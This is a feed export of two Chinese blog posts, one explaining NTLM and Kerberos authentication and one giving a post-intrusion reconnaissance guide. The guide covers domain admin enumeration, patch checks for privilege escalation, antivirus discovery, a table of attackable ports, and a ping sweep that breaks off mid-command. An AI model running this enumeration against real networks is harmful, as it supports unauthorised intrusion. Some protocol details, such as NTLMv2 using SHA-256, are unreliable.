{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"内网安全\" category",
    "description": "",
    "home_page_url": "http://gyzero.shop",
    "items": [
        {
            "id": "http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/",
            "url": "http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/",
            "title": "win协议认证知识",
            "date_published": "2024-03-05T06:48:19.000Z",
            "content_html": "<h2 id=\"ntlm协议\"><a class=\"markdownIt-Anchor\" href=\"#ntlm协议\">#</a> NTLM 协议</h2>\n<p>NTLM（NT LAN Manager）是一套由微软开发的安全协议套件，用于在基于 Windows 的网络中进行身份验证、完整性和机密性保护。NTLM 最初是在上世纪 90 年代初引入的，经过多次修订以增强安全性和功能现在已经更新了 NTMLv2 和 kerberos 协议。</p>\n<h3 id=\"ntlm-hash\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-hash\">#</a> NTLM HASH</h3>\n<p>NT LAN Manager</p>\n<p>长度为 32 位由数字字母组成是认证时的一个重要参照物</p>\n<p>在 windows 中我们的密码通常不是以明文形式传输，而是以哈希值的形式。例如我们设置密码为 admin 密码就会被哈希处理保存在 SAM 数据库中当用户登录时，其密码首先被哈希处理，然后与存储在系统中的哈希值进行比较。</p>\n<p>SAM 文件存储位置 <code>C:\\Windows\\System32\\config\\SAM</code>  是需要系统管理员权限才可以访问查看</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305152021162.png\" alt=\"image-20240305152021162\"></p>\n<h3 id=\"本地认证流程\"><a class=\"markdownIt-Anchor\" href=\"#本地认证流程\">#</a> 本地认证流程</h3>\n<ol>\n<li><strong>用户登录</strong>：当用户尝试登录到 Windows 系统时由 winlogon.exe 管理。</li>\n<li><strong>接收用户输入</strong>：用户在登录界面输入用户名和密码。winlogon.exe 负责接收这些用户输入。</li>\n<li><strong>验证用户凭据</strong>：一旦用户输入了凭据，winlogon.exe 将这些凭据传递给 Local Security Authority Subsystem Service (LSASS)，也就是 lsass.exe。</li>\n<li><strong>认证过程</strong>: lsass.exe 将收到的用户凭据与本地存储的凭据进行比对，这些凭据通常以 NTLM hash 的形式存储在本地安全账户数据库中。lsass.exe 会使用 NTLM hash 算法来验证用户提供的凭据。</li>\n<li><strong>访问授权</strong>：如果凭据验证成功，用户将被授权登录到系统，并获得相应的访问权限。如果验证失败，用户将被拒绝登录</li>\n</ol>\n<h3 id=\"ntlm认证详细流程\"><a class=\"markdownIt-Anchor\" href=\"#ntlm认证详细流程\">#</a> NTLM 认证详细流程</h3>\n<ol>\n<li><strong>协商</strong>：客户端和服务器协商使用的 NTLM 协议版本。</li>\n<li><strong>挑战 / 响应</strong>：服务器向客户端发送一个挑战，客户端以用户凭据的哈希版本进行响应。</li>\n<li><strong>会话安全</strong>：如果凭证被验证，将建立一个用于客户端和服务器之间安全通信的会话密钥。</li>\n</ol>\n<h4 id=\"第一步先协商\"><a class=\"markdownIt-Anchor\" href=\"#第一步先协商\">#</a> 第一步先协商</h4>\n<ul>\n<li>客户端发起连接请求，并包含支持的 NTLM 协议版本列表。</li>\n<li>服务器从客户端提供的列表中选择最高版本的 NTLM 协议 v1,v2 或者更早的 LM 协议，并向客户端发送选定的协议版本</li>\n</ul>\n<h4 id=\"第二步挑战响应\"><a class=\"markdownIt-Anchor\" href=\"#第二步挑战响应\">#</a> 第二步挑战 / 响应</h4>\n<p>首先服务端接收到来自客服端的用户名 test，然后查询本地账户有没有这个 test 用户</p>\n<blockquote>\n<p>没有的话返回认证失败</p>\n<p>有的话认证通过</p>\n</blockquote>\n<p>接着服务端生成一个 Challenge 这是一个 16 字节的随机数每次都不同，然后找到 test 的 NTLM HASH 值并用这个加密 Challenge</p>\n<p>生成一个 net-NTLM-HASH 存在内存中</p>\n<blockquote>\n<p>将 Challenge 发送给客户端</p>\n</blockquote>\n<p>客户端接收到 Challenge 后将 test 的密码转换为 NTMLHASH 然后对 Challenge 加密生成响应 response 也就是 net-NTLM-HASH</p>\n<blockquote>\n<p>客户端的 response 发送给服务端</p>\n</blockquote>\n<p>服务端收到 response 后与之前的 net-NTLM-HASH 进行比较如果相同的话认证通过</p>\n<blockquote>\n<p>认证通过</p>\n</blockquote>\n<h3 id=\"ntlmv1和v2区别\"><a class=\"markdownIt-Anchor\" href=\"#ntlmv1和v2区别\">#</a> NTLMv1 和 v2 区别</h3>\n<ol>\n<li><strong>安全性</strong>:\n<ul>\n<li>NTLMv1: NTLMv1 使用较弱的密码哈希算法（如 LM hash 和 NTLM hash），并且缺乏足够的随机性和安全性措施。它容易受到中间人攻击、字典攻击和重放攻击的影响。</li>\n<li>NTLMv2: NTLMv2 引入了更强大的密码哈希算法，通常是使用更安全的算法，如 MD5 或 SHA-256。它还引入了更多的随机性和安全性措施，例如使用更复杂的挑战 / 响应过程，增加了消息完整性检查等。这使得 NTLMv2 比 NTLMv1 更难以被破解和攻击。</li>\n</ul>\n</li>\n<li><strong>消息结构</strong>:\n<ul>\n<li>NTLMv1: NTLMv1 的消息结构相对简单，通常包括挑战和响应等基本部分。它的消息格式不够复杂，容易受到中间人攻击和重放攻击的影响。</li>\n<li>NTLMv2: NTLMv2 引入了更复杂的消息结构，包括更多的字段和数据元素。它的消息结构更复杂，包含更多的随机数和安全性相关的字段，使得攻击者更难以破解或篡改通信内容。</li>\n</ul>\n</li>\n<li><strong>兼容性</strong>:\n<ul>\n<li>NTLMv1: 尽管 NTLMv1 已被证明存在较大的安全风险，但仍然存在一些环境和遗留系统可能仍在使用 NTLMv1。一些旧版的 Windows 系统和应用程序仍然可能使用 NTLMv1，因此在某些情况下可能无法完全避免。</li>\n<li>NTLMv2: NTLMv2 是更安全的选项，但需要双方都支持才能正常使用。在较新的 Windows 系统和网络环境中，NTLMv2 通常被推荐和优先使用，以提高系统的安全性和兼容性。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"ntlm-hash的安全问题\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-hash的安全问题\">#</a> NTLM-HASH 的安全问题</h3>\n<ol>\n<li><strong>弱密码哈希</strong>：NTLM Hash 使用的是较旧的哈希算法（如 MD4 或 MD5），这些算法已经被证明不安全，容易受到字典攻击、暴力破解等攻击。</li>\n<li><strong>单向散列</strong>：NTLM Hash 是单向散列，即从密码计算出 Hash 值很容易，但从 Hash 值反推出原始密码非常困难。这导致了在没有盐（salt）的情况下，使用彩虹表等预先计算好的 Hash 值进行破解的可能性。</li>\n<li><strong>中间人攻击</strong>：NTLM 协议本身容易受到中间人攻击的影响。攻击者可以拦截 NTLM 挑战 - 响应消息，并使用这些消息来模拟客户端与服务器之间的通信，从而获得对目标系统的访问权限。</li>\n</ol>\n<p><strong>Pass The Hash 攻击</strong>：攻击者可以获取到 NTLM Hash 后，直接使用这个 Hash 进行身份验证，而无需知道用户的明文密码</p>\n<h2 id=\"kerberos协议\"><a class=\"markdownIt-Anchor\" href=\"#kerberos协议\">#</a> Kerberos 协议</h2>\n<p>Kerberos 是一种网络认证协议，其设计目标是通过系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的（如：共享密钥）执行认证服务的。</p>\n<p>麻省理工研发了 Kerberos 协议来保护 Project Athena 提供的网络服务器。这个协议以希腊神话中的人物 Kerberos 命名，他是一条凶猛的三头保卫神犬</p>\n<h3 id=\"kerberos一些术语\"><a class=\"markdownIt-Anchor\" href=\"#kerberos一些术语\">#</a> kerberos 一些术语</h3>\n<ol>\n<li><strong>AS（Authentication Server）- 认证服务器</strong>：\n<ul>\n<li>AS 是 Kerberos 协议中的组件，用于对用户进行身份验证。它负责接收用户的认证请求，并在验证用户身份后向用户颁发 TGT。</li>\n</ul>\n</li>\n<li><strong>KDC（Key Distribution Center）- 密钥分发中心</strong>：\n<ul>\n<li>KDC 是 Kerberos 协议中的总称，由 AS 和 TGS 组成。KDC 通常指的是单个服务器，同时扮演 AS 和 TGS 的角色。</li>\n</ul>\n</li>\n<li><strong>TGT（Ticket Granting Ticket）- 票据授权票据</strong>：\n<ul>\n<li>TGT 是 Kerberos 协议中的票据类型，用于访问 Kerberos 受信任的服务。获得 TGT 后，用户可以向 TGS 请求访问特定服务的票据。</li>\n</ul>\n</li>\n<li><strong>TGS（Ticket Granting Server）- 票据授权服务器</strong>：\n<ul>\n<li>TGS 是 Kerberos 协议中的组件，负责颁发给用户用于访问特定服务的服务票据。用户通过提供 TGT 向 TGS 请求服务票据。</li>\n</ul>\n</li>\n<li><strong>SS（Service Server）- 特定服务提供端</strong>：\n<ul>\n<li>SS 是 Kerberos 协议中的服务端，提供特定的网络服务，例如文件共享、电子邮件等。SS 验证客户端提供的服务票据，并在票据有效时提供服务。</li>\n</ul>\n</li>\n</ol>\n<p>参与认证的三个角色</p>\n<ol>\n<li>\n<h3 id=\"客户端client\"><a class=\"markdownIt-Anchor\" href=\"#客户端client\">#</a> <strong>客户端（Client）</strong>：</h3>\n<ul>\n<li>客户端是发起身份验证请求的一方。在 Kerberos 中，客户端通常是用户或者用户所在的计算机，它们希望获得访问域资源的权限。</li>\n</ul>\n</li>\n<li>\n<p><strong>服务端（Service Server）</strong>：</p>\n<ul>\n<li>服务端是接收身份验证请求的一方，并向客户端提供网络服务。服务端可以是任何提供网络服务的实体，如文件服务器、打印服务器、应用程序服务器等。</li>\n</ul>\n</li>\n<li>\n<p><strong>密钥分发中心（Key Distribution Center，KDC）</strong>：</p>\n<ul>\n<li>密钥分发中心是 Kerberos 协议的关键组件，负责处理身份验证请求并颁发票据。KDC 通常包含两个主要部分：\n<ul>\n<li><strong>AS（Authentication Server）</strong>：负责接收客户端的身份验证请求，并向客户端颁发 TGT（Ticket Granting Ticket，票据授权票据）。</li>\n<li><strong>TGS（Ticket Granting Server）</strong>：负责接收客户端的 TGT，并向客户端颁发用于访问特定服务的服务票据。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"kerberos认证流程\"><a class=\"markdownIt-Anchor\" href=\"#kerberos认证流程\">#</a> Kerberos 认证流程</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305181912124.png\" alt=\"image-20240305181912124\"></p>\n<ol>\n<li><strong>客户端向域控制器请求访问服务器</strong>：客户端首先向域控制器（DC）发送一个请求，请求访问服务器。DC 通过查询活动目录（AD）来确定客户端是否可信。</li>\n<li><strong>域控制器返回 TGT 给客户端</strong>：如果客户端被认证为可信，DC 会返回一个 Ticket Granting Ticket（TGT）给客户端。</li>\n<li><strong>客户端使用 TGT 请求访问服务器</strong>：客户端持有 TGT，然后向 DC 请求访问服务器。Ticket Granting Service（TGS）通过检查客户端消息中的 TGT 来判断客户端是否有访问权限。</li>\n<li><strong>如果客户端有访问权限，DC 会给客户端一个服务票据</strong>：如果客户端有访问权限，DC 会给客户端一个服务票据（Service Ticket，ST）。这个票据授予客户端访问服务器的权限。</li>\n<li><strong>客户端使用服务票据访问服务器</strong>：客户端得到服务票据后，就可以用这个票据去访问服务器。这个票据只对这个服务器有效。</li>\n<li><strong>服务器和客户端建立通信</strong>：最后，服务器和客户端建立通信。</li>\n</ol>\n<h3 id=\"详细流程\"><a class=\"markdownIt-Anchor\" href=\"#详细流程\">#</a> 详细流程</h3>\n<p>•ASREQ &amp; ASREP<br>\n•TGSREQ &amp; TGSREP<br>\n•AP-REQ &amp; AP-REP</p>\n<h4 id=\"第一部分asreq-asrep\"><a class=\"markdownIt-Anchor\" href=\"#第一部分asreq-asrep\">#</a> 第一部分 ASREQ &amp; ASREP</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305182829923.png\" alt=\"image-20240305182829923\"></p>\n<p>客户端向 KDC 发送一个 AS_REQ 请求里面信息包括 Kerberos 协议的版本号，用户名，请求类型，哈希值 NTLM-Hash 加密的时间戳</p>\n<p>还有一些服务器信息，接着 AS 接收到请求后向 AD 查询是否有此用户信息有的话会拿出该用户的 NTLM-Hash 对加密的时间戳进行解密</p>\n<p>五分钟之内预认证成功，认证通过后 KDC 生成两个东西分别是用于客户端和 KGS 之间通信的用客户端用户的 NTLM-HASH 加密的会话密钥 Session Key，和 Ticket Granting Ticket 票据授权票据</p>\n<p>TGT：</p>\n<p>AS 使用 KDC 账户（通常是 Krbtgt 用户，是域控制器创建时自动生成的特殊账户）的 NTLM-Hash 对 Session-key AS、时间戳和客户端信息等进行加密，这个加密过程确保了 TGT 的安全性和机密性，只有 KDC 账户的 NTLM-Hash 才能解密 TGT 并提取其中的信息，然后将加密后的 Session-key AS、时间戳、客户端信息以及 PAC 等信息组合起来，形成 TGT 因为使用服务端 Krbtgt 用户 NTLM-HASH 加密的所以客户端是解不开 TGT 的，TGT 一般为 8 小时有效期</p>\n<p>PAC（Privilege Attribute Certificate）是 TGT 中的一个重要部分，包含了客户端的安全标识符（SID）、所在组等信息。PAC 用于后续的授权过程，以确保客户端在获取服务票据时具有适当的权限。</p>\n<h4 id=\"第二部分tgsreq-tgsrep\"><a class=\"markdownIt-Anchor\" href=\"#第二部分tgsreq-tgsrep\">#</a> 第二部分 TGSREQ &amp; TGSREP</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305203212925.png\" alt=\"image-20240305203212925\"></p>\n<p>该阶段是客户端和 TGS 的认证，通过认证以后获得 ST 服务票据</p>\n<p>客户端接收到回复后获取到 Session key AS 和 TGT，接着将会用 NTLM-HASH 解密 session key AS 得到未加密 sessin key AS</p>\n<p>然后将这些缓存到本地，客户端如果想获取什么服务就会拿着获取的 TGT 加上 Session-Key AS 加密时间戳、Client-info、Server-info 等数据组成 TGSREQ 去请求 TGS 购买 ST 服务票据</p>\n<p>TGS 收到后</p>\n<ol>\n<li><strong>解密 TGT 并验证时间戳</strong>：\n<ul>\n<li>TGS 收到客户端的 TGSREQ 请求后，使用 Krbtgt 用户的 NTLM-hash 解密 TGT，得到其中的 Session-key AS、时间戳、Client-info 和 Server-info 等信息。</li>\n<li>TGS 使用 Session-key AS 解密 TGT 中的信息，得到 Client-info 和时间戳。然后 TGS 将获取到的时间戳与当前时间进行比较，如果时间戳与当前时间相差太久，则需要重新进行身份验证。</li>\n</ul>\n</li>\n<li><strong>验证客户端信息和权限</strong>：\n<ul>\n<li>TGS 进一步比较 TGT 中的 Client-info 与 TGSREQ 请求中的 Client 信息，确保两者一致性。</li>\n<li>如果客户端信息验证通过，并且客户端有权限访问请求的服务，则认证成功。</li>\n</ul>\n</li>\n<li><strong>生成 Session-key TGS 并加密</strong>：\n<ul>\n<li>如果身份验证成功，TGS 生成一个用于客户端和服务器之间通信的会话密钥，称为 Session-key TGS。</li>\n<li>TGS 使用 Session-key AS 加密 Session-key TGS，并将其作为 TGS_REP 响应的一部分发送给客户端，确保通信的安全性。</li>\n</ul>\n</li>\n<li><strong>生成 ST 并加密</strong>：\n<ul>\n<li>另一部分是 TGS 使用目标服务器（Server）的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据，生成服务票据（Service Ticket，ST）。</li>\n<li>TGS 将这个 ST 作为 TGS_REP 响应的一部分发送给客户端</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"第三部分ap-req-ap-rep\"><a class=\"markdownIt-Anchor\" href=\"#第三部分ap-req-ap-rep\">#</a> 第三部分 AP-REQ &amp; AP-REP</h4>\n<p>客户端在收到 TGS 的响应（TGS_REP）后，会使用它的会话密钥（Session-key AS）解密出新的会话密钥（Session-key TGS），并将其存储在本地。然后，当客户端需要访问服务时，它会使用新的会话密钥（Session-key TGS）加密其身份信息（Client-info）和时间戳，然后将其与服务票据（ST）一起发送给服务服务器。这个请求被称为 AP_REQ。</p>\n<p>服务服务器在收到 AP_REQ 请求后，会使用它的 NTLM-Hash 解密服务票据（ST），得到新的会话密钥（Session-key TGS），然后使用这个密钥解密客户端的身份信息（Client-info）和时间戳。然后，服务服务器会将解密出的信息与服务票据（ST）中的信息进行比较，以验证客户端的身份。</p>\n<p>一旦客户端通过了身份验证，服务服务器就会使用 PAC（Privilege Attribute Certificate）去询问域控制器（DC）客户端是否有访问服务的权限。域控制器在接收到 PAC 后，会解密 PAC，然后通过 PAC 中的 SID（Security Identifier）来判断客户端的用户组信息和权限。然后，域控制器会将结果返回给服务服务器，服务服务器再将这些信息与服务资源的访问控制列表（ACL）进行比较，最后决定是否给客户端提供服务。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305205417213.png\" alt=\"image-20240305205417213\"></p>\n<p>Kerberos 的安全问题</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "内网信息收集",
            "date_published": "2024-03-03T09:22:07.000Z",
            "content_html": "<p>进入内网后要对当前网络环境进行判断</p>\n<p>判断出当前机器所处网络环境的拓扑，以及当前电脑在内网是什么角色当前机器的权限</p>\n<h3 id=\"本机信息收集\"><a class=\"markdownIt-Anchor\" href=\"#本机信息收集\">#</a> 本机信息收集</h3>\n<h4 id=\"查询网络配置信息\"><a class=\"markdownIt-Anchor\" href=\"#查询网络配置信息\">#</a> 查询网络配置信息</h4>\n<p><code>ipconfig /all</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135135624.png\" alt=\"image-20240304135135624\"></p>\n<h4 id=\"查看用户详细信息\"><a class=\"markdownIt-Anchor\" href=\"#查看用户详细信息\">#</a> 查看用户详细信息</h4>\n<p><code>whoami /all</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135324706.png\" alt=\"image-20240304135324706\"></p>\n<h4 id=\"查看系统版本补丁等\"><a class=\"markdownIt-Anchor\" href=\"#查看系统版本补丁等\">#</a> 查看系统版本补丁等</h4>\n<p><code>systeminfo</code>  可查看系统信息打了那些补丁为后续提权查找漏洞准备</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140357064.png\" alt=\"image-20240304140357064\"></p>\n<h4 id=\"查看系统启动的服务\"><a class=\"markdownIt-Anchor\" href=\"#查看系统启动的服务\">#</a> 查看系统启动的服务</h4>\n<p>net start</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140458074.png\" alt=\"image-20240304140458074\"></p>\n<h4 id=\"查看系统进程\"><a class=\"markdownIt-Anchor\" href=\"#查看系统进程\">#</a> 查看系统进程</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140610127.png\" alt=\"image-20240304140610127\"></p>\n<h4 id=\"查看主机计划任务列表\"><a class=\"markdownIt-Anchor\" href=\"#查看主机计划任务列表\">#</a> 查看主机计划任务列表</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140751585.png\" alt=\"image-20240304140751585\"></p>\n<h4 id=\"查看本机用户域用户\"><a class=\"markdownIt-Anchor\" href=\"#查看本机用户域用户\">#</a> 查看本机用户域用户</h4>\n<p><code>net user</code> net user /domain</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141626726.png\" alt=\"image-20240304141626726\"></p>\n<h4 id=\"查询域数量\"><a class=\"markdownIt-Anchor\" href=\"#查询域数量\">#</a> 查询域数量</h4>\n<p><code>net view /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141803745.png\" alt=\"image-20240304141803745\"></p>\n<h4 id=\"查询域组\"><a class=\"markdownIt-Anchor\" href=\"#查询域组\">#</a> 查询域组</h4>\n<p><code>net group /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141928484.png\" alt=\"image-20240304141928484\"></p>\n<h4 id=\"查询域中的-domain-admins-组的成员\"><a class=\"markdownIt-Anchor\" href=\"#查询域中的-domain-admins-组的成员\">#</a> 查询域中的 “Domain Admins” 组的成员</h4>\n<p><code>net group &quot;domain admins&quot; /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142138340.png\" alt=\"image-20240304142138340\"></p>\n<h4 id=\"查询域时间主域名\"><a class=\"markdownIt-Anchor\" href=\"#查询域时间主域名\">#</a> 查询域时间主域名</h4>\n<p><code>net time /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142231136.png\" alt=\"image-20240304142231136\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1hZDAxLXVoNWZmNDQ1aHN1aC55dW55aS5pbw==\">主域名为 ad01.yunyi.io</span></p>\n<h4 id=\"查arp缓存\"><a class=\"markdownIt-Anchor\" href=\"#查arp缓存\">#</a> 查 ARP 缓存</h4>\n<p><code>arp -a</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142335688.png\" alt=\"image-20240304142335688\"></p>\n<h4 id=\"查环境变量\"><a class=\"markdownIt-Anchor\" href=\"#查环境变量\">#</a> 查环境变量</h4>\n<p><code>set</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304142615252.png\" alt=\"image-20240304142615252\"></p>\n<h4 id=\"查看安装软件的版本信息\"><a class=\"markdownIt-Anchor\" href=\"#查看安装软件的版本信息\">#</a> 查看安装软件的版本信息</h4>\n<p><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143132821.png\" alt=\"image-20240304143132821\"></p>\n<h4 id=\"域信任列表信息\"><a class=\"markdownIt-Anchor\" href=\"#域信任列表信息\">#</a> 域信任列表信息</h4>\n<p><code>nltest /domain_trusts</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143407722.png\" alt=\"image-20240304143407722\"></p>\n<h4 id=\"防火墙配置信息\"><a class=\"markdownIt-Anchor\" href=\"#防火墙配置信息\">#</a> 防火墙配置信息</h4>\n<p><code>netsh firewall show config</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143537981.png\" alt=\"image-20240304143537981\"></p>\n<h4 id=\"网络详细信息\"><a class=\"markdownIt-Anchor\" href=\"#网络详细信息\">#</a> 网络详细信息</h4>\n<p><code>ipconfig /all</code> <span class=\"exturl\" data-url=\"aHR0cDovL3huLS15dW55aS02bzZoaThocDRraDAwYjJwN2EuaW8=\"> 可看到有域 yunyi.io</span></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304143755101.png\" alt=\"image-20240304143755101\"></p>\n<h4 id=\"查看网络端口信息\"><a class=\"markdownIt-Anchor\" href=\"#查看网络端口信息\">#</a> 查看网络端口信息</h4>\n<p><code>netstat -ano</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144042633.png\" alt=\"image-20240304144042633\"></p>\n<h4 id=\"查杀软查提权\"><a class=\"markdownIt-Anchor\" href=\"#查杀软查提权\">#</a> 查杀软查提权</h4>\n<p><code>tasklist</code>  查看当前计算机上所有进程的列表</p>\n<p><code>systeminfo</code></p>\n<p>查完补丁信息可以去<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4vJUU2JTlGJUE1JUU4JUFGJUEy\"> https://i.hacking8.com/tiquan/ 查询</span></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144509958.png\" alt=\"image-20240304144509958\"></p>\n<p>获取系统运行软件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144622209.png\" alt=\"image-20240304144622209\"></p>\n<p>识别杀软</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304144943521.png\" alt=\"image-20240304144943521\"></p>\n<p>查询当前工作环境</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304145111793.png\" alt=\"image-20240304145111793\"></p>\n<h3 id=\"易受攻击的常见端口\"><a class=\"markdownIt-Anchor\" href=\"#易受攻击的常见端口\">#</a> 易受攻击的常见端口</h3>\n<p>80 / 8080     <strong>HTTP</strong>         　　　　　　　　　　　　　　　　　　　　　Web 攻击 \\ 爆破 \\ 对应服务器版本漏洞</p>\n<p>443            <strong>HTTPS</strong>                                                同上</p>\n<p>7001/7002      <strong>WebLogic 控制台</strong>　　　　　　　　　　　　　　　　　　　　　　java 反序列化 \\ 弱口令</p>\n<p>8080 /8089     <strong>Jboss/Resin/Jetty/Jenkins</strong>    　　　　　　　　　　　　　　　反序列化 \\ 控制台弱口令</p>\n<p>9090          <strong>WebSphere 控制台</strong>       　　　　　　　　　　　　　　　　　java 反序列化 \\ 弱口令</p>\n<p>4848          <strong>GlassFish</strong> 控制台       　　　　　　　　　　　　　　　　　弱口令</p>\n<p>1352          <strong>Lotus domino</strong> 邮件服务                                  弱口令 \\ 信息泄露 \\ 爆破</p>\n<p>10000         <strong>Webmin-Web</strong> 控制面板                                  弱口令</p>\n<p>3306         <strong>MySQL</strong>　　                                           注入 \\ 提权 \\ 爆破</p>\n<p>1433         <strong>SQLserver</strong>                                           注入 \\ 提权 \\SA 弱口令 \\ 爆破</p>\n<p>1521          <strong>Oracle</strong> 数据库                                         TNS 爆破 \\ 注入 \\ 反弹 Shell</p>\n<p>5432          PostgreSQL 数据库                                    爆破 \\ 注入 \\ 弱口令</p>\n<p>27017 / 27018  MongoDB                                            爆破 \\ 未授权访问</p>\n<p>6379           Redis 数据库                                          可尝试未授权访问 \\ 弱口令爆破</p>\n<p>5000          SysBase/DB2 数据库                                   爆破 \\ 注入</p>\n<p>25          <strong>SMTP</strong> 邮件服务                                   邮件伪造</p>\n<p>110         <strong>POP3</strong> 协议                                       爆破 \\ 嗅探</p>\n<p>143         <strong>IMAP</strong> 协议                                       爆破</p>\n<p>53         <strong>DNS</strong> 域名系统                                   允许区域传送 \\DNS 劫持 \\ 缓存投毒 \\ 欺骗</p>\n<p>67 / 68      <strong>DHCP</strong> 服务                                      劫持 \\ 欺骗</p>\n<p>161        <strong>SNMP</strong> 协议                                      爆破 \\ 搜集目标内网信息</p>\n<p>2181        <strong>Zookeeper</strong> 服务                                   未授权访问</p>\n<p>8069         <strong>Zabbix</strong> 服务                                      远程执行 \\ SQL 注入</p>\n<p>9200 /9300   <strong>Elasticsearch</strong> 服务                                远程执行</p>\n<p>11211        <strong>Memcache</strong> 服务                                 未授权访问</p>\n<p>512 / 513 /514  <strong>Linux Rexec</strong> 服务                                爆破 \\ Rlogin 登陆</p>\n<p>873          <strong>Rsync</strong> 服务                                      匿名访问 \\ 文件上传</p>\n<p>3690        <strong>Svn</strong> 服务                                        Svn 泄露 \\ 未授权访问</p>\n<p>50000         <strong>SAP Management Console</strong>                                远程执行</p>\n<h3 id=\"存活主机探测\"><a class=\"markdownIt-Anchor\" href=\"#存活主机探测\">#</a> 存活主机探测</h3>\n<h4 id=\"icmp协议探测\"><a class=\"markdownIt-Anchor\" href=\"#icmp协议探测\">#</a> icmp 协议探测</h4>\n<p>win</p>\n<p><code>for /L %I in (1,1,254) Do @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&quot;</code></p>\n<p>linux</p>\n<p><code>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; '&#123;print $4&#125;'; 